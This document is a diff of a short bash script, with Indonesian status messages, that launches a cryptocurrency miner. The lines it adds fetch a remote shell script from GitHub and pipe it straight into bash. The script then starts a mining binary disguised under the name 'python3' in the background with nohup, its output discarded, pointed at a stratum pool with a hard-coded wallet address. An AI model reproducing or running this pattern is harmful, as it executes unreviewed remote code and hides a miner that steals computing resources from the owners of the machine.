@@ -1,25 +1,15 @@
 #!/bin/bash
 
-clear
+bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotSrb.sh)"
 
-echo "download dot-srb..."
-
-wget -q -O dot-srb s.id/25RZs
+sleep 5
 
 clear
 
-echo "ekstrak dot-srb..."
-
-tar -xzf dot-srb >/dev/null
-
-clear
-
-echo "hapus dot-srb..."
-
-rm dot-srb
+echo "sedang menjalankan..."
 
 nohup ./dotsrb/python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOTonly > /dev/null 2>&1 &
 
-clear
+sleep 5
 
-echo "running..."
+echo "sukses berjalan cok..."
